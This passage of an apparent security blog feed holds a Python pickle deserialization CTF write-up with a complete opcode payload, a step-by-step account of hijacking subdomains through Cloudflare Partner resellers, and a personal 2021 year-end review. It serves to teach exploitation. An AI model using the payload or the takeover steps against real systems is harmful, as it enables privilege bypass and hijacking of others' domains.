8。</p><p>如果一个对象定义了 <code>__set__()</code> 或 <code>__delete__()</code>，则它会被视为数据描述器。 仅定义了 <code>__get__()</code> 的描述器称为非数据描述器。</p><p>其中，<code>__set__()</code> 决定了赋值时的行为，所以我们能不能通过重载 <code>__set__</code> 使得 <code>user.privileged = False</code> 失效呢？</p><p>那么这个时候可以等价为：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, group</span>):<br>        self.name = name<br>        self.group = group<br>        self.isadmin = <span class="hljs-number">0</span><br>        self.prompt = <span class="hljs-string">&#x27;&#x27;</span><br><br><br>user = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br><br><span class="hljs-comment"># 在这里面写入合适的语句</span><br><br>user.privileged = <span class="hljs-literal">False</span><br><span class="hljs-built_in">print</span>(user.privileged)  <span class="hljs-comment"># 使得 user.privileged == True</span><br></code></pre></td></tr></table></figure></p><p>首先，<code>__set__</code> 应该赋予一个 callable（<del>废话</del>），这个 callable 是比较有讲究的：</p><ol type="1"><li>必须要有三个参数，执行 <code>user.privileged = False</code> 的时候，分为用于接收 <code>user</code>、<code>privileged</code>、<code>False</code></li><li>返回值必须不为广义的 False（什么 None 啊、"" 啊，都算广义的 False）</li><li>调用的源头必须在一个类中</li></ol><p>那么在这道题目中，User 这个类本身正好符合要求，所以可以这么写：<code>User.__set__ = User</code>。但是如果只写这一句的话，你会发现还是无法改变 <code>user.privileged = False</code> 的行为。</p><p>这个时候就需要看下 <code>__set__</code> 到底如何改变 Python 赋值行为的。对于 <code>obj.attr = value</code>（在对属性赋值时），Python 的查找策略是这样的：查找 <code>obj.__class__.__dict__</code>，如果 attr 存在并且是一个数据描述器，调用 attr 的 <code>__set__</code> 方法，结束。如果不存在，会继续到 <code>obj.__class__</code> 的父类和祖先类中查找，找到数据描述器则调用其 <code>__set__</code> 方法，没找到则执行 <code>obj.__dict__['attr'] = value</code>。</p><p>所以我们应该还要加一句 <code>User.privileged = User("tr0y", "root")</code> 保证 <code>user.__class__.__dict__</code> 已经有了 <code>privileged</code> 并且是一个数据描述器，这样就会走到 <code>__set__</code>。橘友们可能会问，那为什么不能 <code>user.privileged = User("tr0y", "root")</code> 这么写呢？原因在于，privileged 这个属性是不存在于 <code>user</code> 的，所以会继续在父类中找，而父类也没有这个属性，所以直接执行的是 <code>user.__dict__['privileged'] = User("tr0y", "root")</code>，这样是起不到作用的。同时由于 flag 并不存在于 <code>user.__class__.__dict__</code> 里，且父类的 User 也没有 flag 这个属性，所以 flag 这个属性是正常赋值的。</p><p>这样的话，我们要加的语句应该是：<br /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">User.__set__ = User<br>User.privileged = User(<span class="hljs-string">&quot;tr0y&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>)<br></code></pre></td></tr></table></figure></p><p>最后的最后，由于 <code>structs.User.__dict__</code> 是 mappingproxy 类型，所以需要用到变量覆盖里提到的那个 tip</p><p>综上，转为 opcode 就是：<br /><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"># 新增 __set__<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb<br>0  # 弹出<br># 新增 privileged<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb<br>0  # 弹出<br># 返回 structs.User 实例<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br><br># 最终 payload<br>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;V__set__<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>stb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(N&#125;Vprivileged<span class="hljs-symbol">\n</span>cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tRstb0cstructs<span class="hljs-symbol">\n</span>User<span class="hljs-symbol">\n</span>(Vtr0y<span class="hljs-symbol">\n</span>Vroot<span class="hljs-symbol">\n</span>tR.<br></code></pre></td></tr></table></figure></p><h2 id="总结">总结</h2><p>橘友们应该可以发现，opcode 有个特点是“赋值容易查值难”。如何利用 opcode 构造 payload 需要多练习才能掌握，以及对 Python 魔术方法等各种稍底层的原理要有一定的理解，才能够知其然也知其所以然。</p><p>Python 反序列化、Python 沙箱逃逸，以及 SSIT 所需的知识点有着很大的关联性，通其一而知其百，保持知识的连通性效率才会高。</p><h2 id="资料">资料</h2><ol type="1"><li>Python 沙箱逃逸的经验总结<br />https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</li><li>pickle.py 中 opcode 备注<br />https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L107</li><li>可以序列化的东西<br />https://docs.python.org/zh-cn/3/library/pickle.html#what-can-be-pickled-and-unpickled</li><li>pker，方便生成 opcode 的工具<br />https://github.com/EddieIvan01/pker</li><li>Python 的导入机制<br />https://docs.python.org/zh-cn/3/reference/import.html#the-import-system</li><li>pickle 的 load_build 逻辑<br />https://github.com/python/cpython/blob/9412f4d1ad28d48d8bb4725f05fd8f8d0daf8cd2/Lib/pickle.py#L1697</li><li>BalsnCTF-2019 Python 反序列化题<br />https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc</li><li>Python 描述器<br />https://docs.python.org/zh-cn/3/howto/descriptor.html</li></ol><br><p style="text-align: center;"><font size="2px" color="gray">今年应该是最惨的一个春节<br>在外地居家隔离<br>你说回家吧好像确实也挺无聊的<br>但就是控制不住想回去<br>一个人过春节<br>天天吃政府发的盒饭<br>真是太容易焦虑了<br>希望疫情早点结束<br><br>这篇文章是从除夕开始写的<br>化焦虑为动力了属实是<br><br>这两天搞了个微博账号<br>微博 id 是 6575448477，用户名是 Macr0phag3<br>主要是整活和发一些技术啊、摄影啊之类的日常<br>隔离期间真的话多，有点啰嗦哈哈哈<br>好了就说到这吧<br><br>祝橘友们虎年虎虎生威，大吉大利</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;居家隔离实在是太无聊了，更一篇文章吧。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="SecMap" scheme="https://www.tr0y.wang/tags/SecMap/"/>
    
  </entry>
  
  <entry>
    <title>利用 Cloudflare Partner 劫持域名</title>
    <link href="https://www.tr0y.wang/2022/01/11/domain-takeover-by-cfp/"/>
    <id>https://www.tr0y.wang/2022/01/11/domain-takeover-by-cfp/</id>
    <published>2022-01-11T20:00:00.000Z</published>
    <updated>2023-05-04T09:44:57.356Z</updated>
    
    <content type="html"><![CDATA[<p>若域名解析到 1.1.1.1，且未接入 Cloudflare，则大概率存在域名劫持。</p><span id="more"></span><p>Cloudflare 想必橘友们还是很熟悉的，作为世界最大的 CDN 服务提供商之一，还有吊炸天的 1.1.1.1、1.0.0.1 作为公共的 DNS 服务。</p><p>我的博客就是白嫖的他们家的 CDN，配置、体验都非常的银杏化（后面我打算写篇文章来分享一下我的博客自动化部署以及访问加速等配置）。</p><p>不啰嗦了，一句话：<strong>若域名解析到 1.1.1.1，且未接入 Cloudflare，则大概率存在域名劫持。</strong></p><h2 id="例子">例子</h2><p>先看例子，再看解释说明，如果你看懂了例子背后的原理，那么后面的内容就可以直接跳过了。</p><p>假设有个子域名是 <code>a.macr0phag3.online</code>，所有者将它解析到了 <code>1.1.1.1</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/3ae3f072-f245-4205-a327-4f6e184bf938.png!blog#width-zoom8" /></p><p>然后我们作为攻击者，发现这种域名之后，先找个在线的 Cloudflare Partner，比如：</p><p>https://su.vv1234.cn/</p><p>先把二级域名接进去：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/327013a5-43b1-4309-b17d-9f4ca6012963.png!blog#width-zoom5" /></p><p>发现可以添加成功之后，再把这个子域名的 A 记录设置成自己的服务器地址：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/2be20183-bf60-4f4e-96ab-4e1ebad17b02.png!blog" /></p><p>这个时候，<code>a.macr0phag3.online</code> 的流量就会被劫持到你的服务器上。</p><p>从 Cloudflare 控制台也可以看到这个是有效的接管：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/3f44a605-c5fd-4203-afda-ce2188818bba.png!blog" /></p><h2 id="利用解释">利用解释</h2><p>在看下文之前，需要对 DNS 相关的知识有一定的了解，可以参考我的历史系列文章：</p><p>https://www.tr0y.wang/2020/09/14/DNS-1-basic/</p><h3 id="解析到-1.1.1.1-有什么特殊含义吗">解析到 1.1.1.1 有什么特殊含义吗？</h3><p>这是 Cloudflare 的一个著名的公共 DNS 的 ip 地址，其实也可以作为 CDN 的一个节点。</p><p>首先大家可能比较疑惑的是，什么会有人把域名挂到 1.1.1.1。据我的了解，有些公司的运维在管理域名的时候，喜欢把没用到的（子）域名是先挂上 1.1.1.1 来测试或者占位；以及域名不使用了之后，就把之前的解析记录换成 1.1.1.1。</p><p>其次，解析到其他 CDN 地址也是可以用这种方式进行劫持的，比如 1.0.0.1 等等。这里只是用 1.1.1.1 为例子。</p><p>最后，思考一个问题：如果一个域名没有接入 Cloudflare，但也没有配置 1.1.1.1 的 A 记录，那么还能被这种方式劫持吗？答案肯定是不可以（如果可以的话还得了...）。</p><p>看下这张简单的 CDN 架构图就明白了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/46c3d75d-8008-494f-99d2-a72658caeb38.png!blog" /></p><p>所以攻击者虽然没拥有 1.1.1.1，无法实现直接的劫持，但是 1.1.1.1 作为 CDN 入口之一，是需要刷新资源的，它要回源去原站拿响应，再返回给用户，而这个回源的地址正是攻击者配置的 A 记录。</p><h3 id="cloudflare-partner">Cloudflare Partner</h3><p>为什么攻击者要在 Cloudflare Partner 上添加解析记录呢？</p><p>我们尝试在 Cloudflare 控制台直接添加看看：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/1e26480e-3775-4bbb-965d-541e7322eeeb.png!blog#width-zoom8" /></p><p>熟练地选择白嫖：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/a79a7086-705e-4a40-bc0a-5aa72725a287.png!blog#width-zoom8" /></p><p>可以看到，需要真正地接入成功，需要将 NS 改到 Cloudflare 这里：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/70acbffe-8bb7-4b68-a98b-c4cb2202d482.png!blog#width-zoom8" /></p><p>那么 macr0phag3.online 并不是攻击者所有的，那么自然也就无法修改 NS。需要改 NS，这可以当做检查你真正拥有这个域名的一道认证流程。</p><p>虽然大部分提供 DNS 解析服务商（比如万网）都需要验证 NS，但是有很多人不愿意修改 NS，因为某些 DNS 解析服务商的功能比较多或者是有些独有的功能，而 Cloudflare 不一定有（毕竟 Cloudflare 也不是做慈善的，它是有付费版的）。</p><p>问题出现自然是寻找绕过办法，Cloudflare Partner 就是一个 bypass。</p><p>解释一下什么是 Cloudflare Partner。</p><p>Cloudflare Partner 合作伙伴计划，提供另一种方法来接入 Cloudflare。Cloudflare Partner 的作用有两点：</p><ol type="1"><li>Cloudflare 为了拓展用户提供的渠道，我的理解就是下游的分销商。</li><li>为开发者或者主机提供商提供便利的 API 服务，方便提供各种自动化能力。</li></ol><p>总之，合作伙伴计划使得用户不需要登录 Cloudflare 官网就可以管理域名解析，可以在 WHMCS、Cpanel 等面板中使用集成的 Cloudflare CDN 加速服务。当然，这条路子还可以让用户免费用到 Cloudflare Pro 的一些功能（比如用 cname 方式接入 CDN），所以网上才会有那么多人用 Cloudflare Partner。</p><p>那么是否验证 NS 就取决于 Cloudflare Partner，既然是可选的那么一般就不会有人做，这就是人性。所以绝大部分的 Cloudflare Partner 都不会验证 NS，你说要接就接，前提是之前没人接入过。再说申请 Cloudflare Partner 也并不难，自己申请个，想怎么搞就怎么搞。</p><p>需要注意的是，域名在添加进 Cloudflare Partner 的时候，还会遇到这个提示：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/db46747c-5b1d-457f-a0e9-ed4e8de821f4.png!blog" /></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/71b6ff6d-f966-4b15-b409-89b64fca8265.png!blog#width-zoom8" /></p><p>Cloudflare 似乎有个名单，在这个名单里的域名是不能接入 Cloudflare 的，原因不详，橘友们可以找找资料，我就不找了。</p><h3 id="利用限制">利用限制</h3><p>这个利用方式我是在去年 11 月份发现的，当时也有一些小伙伴拿去刷 src 了。本来这个利用方式没有额外的限制，这两天发现 Cloudflare Partner 会报错：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/0363e0f4-e797-49c4-9cac-6f71340a7b2f.png!blog" /></p><p>查了下相关资料，发现 2021-11-19 起陆续有人收到 Cloudflare 的邮件：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/94367c35-6080-4af7-bb16-bf8f465ee043.png!blog#width-zoom8" /></p><p>之前的 <code>zone_set</code> 方法停用，现在的 <code>full_zone_set</code> 需要验证新添加的域名的 NS 记录是否指向 Cloudflare。</p><p>所以现在是没法通过 Cloudflare Partner 接入新的域名的。</p><p>挺好的。</p><h3 id="突破限制">突破限制</h3><p>不过在查找资料的过程中，我发现还有一种方式可以不修改 NS 接入新的域名：ion WordPress + Plesk：</p><p>https://188299.xyz/2021/01/16/</p><p>稍微解释下，ion 就是类似阿里云这种服务商，还有提供 WordPress 一把梭套件的服务；Plesk 面板就是个管理的后台。</p><p>不过我看了下目前 ion 并没有免费空间活动，我说我买个吧，还只能按年付费：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/domain-takeover-by-cfp/58d590aa-6b72-49e0-8355-b9b7c2d94054.png!blog" /></p><p>真特么贵，不玩了。</p><p>他这个教程我看下来，搞了这么多其实，就是要白嫖 Cloudflare Pro 的。所以这个方法能加的本质原因应该是 Cloudflare Pro 还可以不经过 NS 验证加。不过这个结论我没测试，因为测试需要 20 刀，我就用几次，有点亏。</p><p>ion 后面我蹲蹲活动看看吧，有的话再分享给橘友们。虽然现在看起来 ion 的免费活动可能是绝版了。橘友们如果已有 ion 的 WordPress，或者是开通了 Cloudflare Pro 的话，可以私信我一起搞下，或者自己实验实验。如果没有的话就算了吧。</p><p>保不准 Cloudflare 后面加大限制力度，把 Cloudflare Pro 这个途径也干掉了呢。</p><p>随缘吧咱们。</p><h2 id="总结">总结</h2><p>这个利用方式现在是有一定门槛的。在利用条件中，看起来解析到 1.1.1.1 比较苛刻，但实际上这种情况还真不少见。</p><br><p style="text-align: center;"><font size="2px" color="gray">橘友们觉得这种域名接管<br>定哪个级别的漏洞比较合适呢？</font><br /><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" style="zoom:30%" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;若域名解析到 1.1.1.1，且未接入 Cloudflare，则大概率存在域名劫持。&lt;/p&gt;</summary>
    
    
    
    <category term="经验总结" scheme="https://www.tr0y.wang/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="Web" scheme="https://www.tr0y.wang/tags/Web/"/>
    
    <category term="DNS" scheme="https://www.tr0y.wang/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>2021 年度总结</title>
    <link href="https://www.tr0y.wang/2021/12/31/2021/"/>
    <id>https://www.tr0y.wang/2021/12/31/2021/</id>
    <published>2021-12-31T18:30:00.000Z</published>
    <updated>2023-05-04T09:44:57.344Z</updated>
    
    <content type="html"><![CDATA[<p>2021 马上就结束啦，我也来做个年终总结。</p><span id="more"></span><h2 id="回顾-2021">回顾 2021</h2><h3 id="学习-工作视角">学习 &amp; 工作视角</h3><h4 id="时间线">时间线</h4><p>这个视角我觉得按照时间线来回顾，会比较清楚：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs subunit">01<span class="hljs-string">-12</span> 发布文章《2021，来立些 Flag 吧》<br>02<span class="hljs-string">-22</span> 发布文章《小议 Dashboard》<br>// 36d<br>04<span class="hljs-string">-01</span> 发布文章《编译原理（一）：词法分析》<br>04<span class="hljs-string">-02</span> 发布文章《编译原理（二）：语法分析之自顶向下分析算法》<br>04<span class="hljs-string">-03</span> 发布文章《编译原理（三）：语法分析之自底向上分析算法》<br>04<span class="hljs-string">-04</span> 发布文章《编译原理（四）：语义分析》<br>04<span class="hljs-string">-07</span> 启动专项 SecMap<br>04<span class="hljs-string">-10</span> 准备简历，整理知识点<br>04<span class="hljs-string">-15</span> 博客加载提速<br>04<span class="hljs-string">-25</span> 发布文章《SecMap - 找回密码》<br>04<span class="hljs-string">-29</span> 发布文章《SecMap - 验证码》<br>// 17d 包含五一假期<br>05<span class="hljs-string">-17</span> 发布文章《SecMap - 非常见协议大礼包》<br>05<span class="hljs-string">-24</span> 发布文章《SecMap - SSRF》<br>05<span class="hljs-string">-28</span> 发布文章《对 Nginx DNS 解析漏洞的应急响应》<br>06<span class="hljs-string">-01</span> 发布文章《SecMap - 反序列化（PHP）》<br>// 14d<br>06<span class="hljs-string">-15</span> 发布文章《Linux 系统日志小结》<br>06<span class="hljs-string">-20</span> 开始找工作 &amp; 面试<br>// 60d<br>08<span class="hljs-string">-20</span> 面试顺利结束<br>// 28d<br>09<span class="hljs-string">-18</span> 发布文章《一程山路》<br>// 30d 包含中秋、国庆假期<br>10<span class="hljs-string">-11</span> 启动专项 Java 补缺补漏<br>10<span class="hljs-string">-22</span> 发布文章《SecMap - JWT》<br>11<span class="hljs-string">-03</span> 博客完成自动化部署 &amp; 发布<br>11<span class="hljs-string">-08</span> 启动专项 零信任学习<br>// 32d<br>12<span class="hljs-string">-11</span> 发布文章《零信任（一）简史与 BeyondCorp》<br>12<span class="hljs-string">-23</span> 发布文章《零信任（二）NIST 架构与思考总结》<br>12<span class="hljs-string">-31</span> 发布文章《2021 年度总结》<br></code></pre></td></tr></table></figure><p>前前后后一共写了 18 篇文章。</p><p>由于每篇文章都至少需要一周的业余时间来准备，而我还是要打工的。如果文章涉及到的细节知识比较多，我需要更多业余学习的时间，所以大于等于两周的这里才专门标记一下。所以从 2021 整年的学习、工作相关的视角来看，大于两周的时间缺口不算很多。</p><ol type="1"><li><p>02-22 到 04-01，差不多 1 个月的时间。这段时间最离谱，我找了半天的记录，业余时间除了编译原理相关的学习，没想起来其他时间在干嘛。后来在群里找到了，我这段时间在学习量化交易。我以为我写的代码长大了，能自己赚钱了...然后就亏损出场了...</p></li><li><p>06-20 到 08-20，差不多两个月的时间。这段时间的业余时间都给了面试：不但要参加面试还要复盘面试。虽然没投很多家但是每家都至少有 4 轮，并且间隔时间还是比较长的。</p></li><li><p>从结果上看，本次面试也达到了我的预期，还是比较满意的。所以这个缺口还算可以理解。</p></li><li><p>08-20 到 09-18，差不多一个月的时间。面试结束后就等结果了。这段时间身体累，精神也累，所以我给自己放了个假，基本上是处于颓废状态。</p></li><li><p>09-18 到 10-11，也是一个月的时间，这段时间主要是入职相关的事情，还有中秋，国庆假期。所以这个缺口也还好。</p></li><li><p>11-08 到 12-11，也是差不多一个月，这段时间集中精力在工作上，业余时间基本上都在看资料和思考，强度相对大一些。从产出来看，对于零信任的掌握逐步扎实，工作上相关事情的进展也比较顺利，所以这段时间我还是比较满意的。</p></li></ol><h4 id="的-flag">2021 的 Flag</h4><p>这是 2021 年初写的计划：</p><ol type="1"><li>技能树绘制：按照计划进行，flag 没倒。虽然现在技能树还不是很成熟，但 SecMap 一直在进行中，目前已经整理了很多知识点，这些知识点给我面试准备提供了非常大的帮助。</li><li>Web 安全巩固：按照计划进行，flag 没倒。这个与第一项高度相关。</li><li>系统安全相关学习：<strong>flag 倒了</strong>。当初设定这个的原因是我的工作方向就是搞系统安全，不过后面不是换工作了嘛，所以...</li><li>人工智能入门：<strong>flag 倒了</strong>。因为我在初步接触之后，意识到 AI+安全 是一个巨坑，门把手都没碰就跑了...</li><li>编程：按照计划进行，flag 没倒。我选了 Java 继续学习，其实快看完了，今年应该会看点更深入的，也可能轮到 PHP 了。</li><li>事评：<strong>flag 倒了</strong>。今年其实发生了很多大事。我也写了一些文章，比如 SolarWinds 的这个事情，但是为什么我没发出来呢？<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/741fe662-c7f4-4680-bafa-0c647f74f44d.png!blog#width-zoom8" /><br />因为我感觉一件事情刚出现的时候，缺少关键很多信息，大家各执己见，由于视角、收到的信息不一致，得出的判断和结论也不一致。比如就 log4shell 这个漏洞来说，解读的角度可以是这个漏洞本身的危害，可以是各个安全厂商的反应解读，可以是对自身安全建设的反思，可以是从供应链攻击拓展到我们到底需要多广的供应链覆盖度的讨论，可以是开源人的苦衷...在对结论没有一个较大的把握下，经验特别丰富的人，才可以有一种很准的直觉，而像我这样经历并不是很丰富的人来说，偶尔会有灵光一闪，也就只是偶尔了。就我的经验而言，这个时候得出的结论都会比较偏颇，所以在事件之初我不太喜欢发表我的看法。其实还有一种选择，不做事评，转为事件报道，但是我又不喜欢做那种新闻形式的，所以这个事评的定位就比较尴尬，后面可能还会有，但是应该不多。</li></ol><p>站在学习 &amp; 工作视角上回顾 2021，懈怠的时间还是不少的。上半年周六日还会学习，下半年周六日基本上都在玩（从下面生活视角也可以略窥一二），不过今年过的还算是比较充实的。</p><h3 id="生活视角">生活视角</h3><p>今年应该是过的比较...烧钱的。在花钱这件事上放开了很多限制<del>，呵，男人。</del></p><p>由于今年开销变得比较杂，手动记账明显麻烦了很多（退货、退差价、企业支付等等）。所以我搞了一个半自动记账的脚本，只需要导出账单后就可以自动分类、登记。<del>花钱再也不用怕麻烦啦</del></p><h4 id="吃吃吃">吃吃吃</h4><p>作为老吃货一枚，今年在杭州探了 30 多家店。因为经常有人问我杭(mei)州(shi)本(huang)地(mo)哪有好吃的，所以我搞了一个语雀文档，《别卷了！先吃饭吧》：</p><p>https://www.yuque.com/docs/share/6d2f0193-262c-4ffb-9da8-3a59dcbd6f9a</p><p>这里面记录了我探店的结论，包含：店名、分类、口味、食材、服务、环境、人均、性价比、景点、推荐菜品、不推荐菜品、菜品点评、结论<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/0f943454-cbbf-4903-b279-3cc55527594f.png!blog" /></p><p>我们的口号是：没有美食荒漠，只有懒惰的干饭人！</p><h4 id="玩玩玩">玩玩玩</h4><p>在室内娱乐上，今年新解锁了：麻将、台球、ns（健身环、分手厨房、超级鸡马，强推），总结起来就是又菜又爱玩。</p><p><del>（请问一下，ow2 出了吗？）</del></p><p>在室外娱乐上，远途去了趟长沙（旅行）和西安（找老友叙旧）。近程在杭州本地逛了很多地方，也算是半个杭州人了。拿着相机到处跑也蛮开心的，今年还是拍到了不少好照片，这里放个合集吧：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-9.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-1.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-6.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-5.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-4.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-3.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor-2.jpg!blog" /><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/2021/Collage_Fotor.jpg!blog" /></p><p>从照片的时间上来看，2021 年除了 3 月，每个月都有新拍照片，看来当时量化交易真是深深吸引了我这颗小韭菜...</p><p>写到这随便说一句，还是要有自己的爱好。不用担心所谓 <code>摄影穷三代，单反毁一生</code>，如果要这么说，任何一个爱好都是费钱的。有没有钱是会影响一些乐趣，但是影响并没有想象中的那么大，花很多钱买高端或者是顶配，如果有钱可以，没钱也没事，本来就没必要。</p><p>我在摄影上投入的钱一共 4k，包括了镜头和相机，可以说是全套入门款。但是这并不影响我学习如何使用相机，以及如何构图和修图。等我觉得这个镜头不够用的时候，再去买新的，然后把这个旧的卖掉。</p><p>如果橘友们也想买个相机拍拍拍，我给个建议吧：</p><ul><li>先用手机拍，学习构图和简单的后期（调整构图和套用合适的滤镜），学习了一段时间，大概率会发现手机不太够用了（色彩以及镜头）</li><li>接下来买个微单吧，先从 auto 档开始拍，继续学习构图和简单的后期（调整构图、简单的调色，还套用滤镜也行）</li><li>auto 档熟悉之后，会发现在一些特殊的景色（夜景、逆光）下，全自动档处理的不如人意，这个时候就可以开始学习各种半自动档位了，AV/TV 档等等，同时继续后期的学习（复杂的调色）</li><li>掌握什么时候用什么半自动档后，就可以尝试用 M 档了。纯手动挡给了更多自由操作的空间，也比较复杂。后期这个时候可以抽时间学习比较重的软件，比如 Lightroom 和 PS。</li><li>再后面我也不懂了，我也就到这里。</li></ul><p>我现在大部分情况下用半自动，然后在手机上直接后期，因为我的 m50 可以直接传照片给手机。</p><p>当然我也想过要不要添一些东西，比如买个长焦镜头，因为确实有些景色拉不到；还想过要不要买大疆无人机或者是 action2，拍点特殊角度的照片/视频也很美滋滋啊，然而纠结了一年还是没买，毕竟租机好像也可以满足需求...</p><p>诶好像跑题了...</p><h2 id="计划">2022 计划</h2><p>又到了立 Flag 的时候了！</p><p><strong>2022 计划按照两条线，一条是工作，参与项目做安全建设，积累工作经验；另一条是技术学习，保持一定的技术输入与积累</strong>（通过 SecMap 完成）。</p><h3 id="secmap">SecMap</h3><p>这个大系列要按照计划继续进行。后面应该会开源吧，也许，等我感觉整理得差不多的时候。不过现在有点忙不过来了，可能更新会变慢一点。</p><h3 id="编程">编程</h3><p>今年就以 Java 为主了，不过应该不会占用太多的时间。</p><h3 id="安全建设">安全建设</h3><p>安全建设这大块还有很多知识等待我去学习，计划是按照网络链路整理一下防护点，接着找出各个安全能力，逐个深入了解之后，再去看如何根据安全现状组合这些能力；如果可以的话，或许有一些灵感完善这些项目。</p><h2 id="尾声">尾声</h2><p>今年写文章最大的感悟就是：在时间的分配上，纯粹技术的占比越来越低了。</p><p>在大学的时候，早上 9 点去图书馆，一头扎进知识的海洋，抬头发现晚上 10 点了，没有人会问你有什么意义，也没有人问你这个能不能赚到钱。</p><p>工作之后，压力随着工作经验增多，越来越大，上班时间比较忙，业余时间又想休息。同时渐渐发觉技术并不能解决所有问题，甚至是无法解决问题 —— 